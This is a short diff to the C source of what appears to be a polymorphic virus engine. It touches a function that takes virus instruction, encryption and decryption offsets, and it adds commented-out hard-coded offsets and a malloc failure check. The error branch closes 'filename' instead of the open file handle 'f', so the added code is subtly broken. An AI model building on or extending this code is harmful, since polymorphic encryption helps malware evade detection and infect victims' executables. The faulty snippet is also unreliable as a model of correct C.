@@ -23,6 +23,10 @@ int polymorphic(unsigned long virus_instruction_begin, unsigned long virus_encry
 	// seed the random number generator
 	srand(time(NULL));
 
+
+
+
+
 	unsigned long full_addr_enc_begin = virus_instruction_begin;
 
 	// to get offset just delete the most significant char
@@ -53,6 +57,11 @@ int polymorphic(unsigned long virus_instruction_begin, unsigned long virus_encry
 
 
 
+	// virus_instruction_begin = 4656;
+	// virus_encrypt_size=2528;
+	// virus_decrypt_offset =7379;
+
+
 
 
 
@@ -65,6 +74,12 @@ int polymorphic(unsigned long virus_instruction_begin, unsigned long virus_encry
 	fseek(f, 0, SEEK_SET);  /* same as rewind(f); */
 
 	char *string = malloc(fsize + 1);
+	if(!string)
+	{
+			fclose(filename);
+			printf("Executable data allocation failed\n");
+			return 1;
+	}
 	fread(string, 1, fsize, f);
 	fclose(f);
 
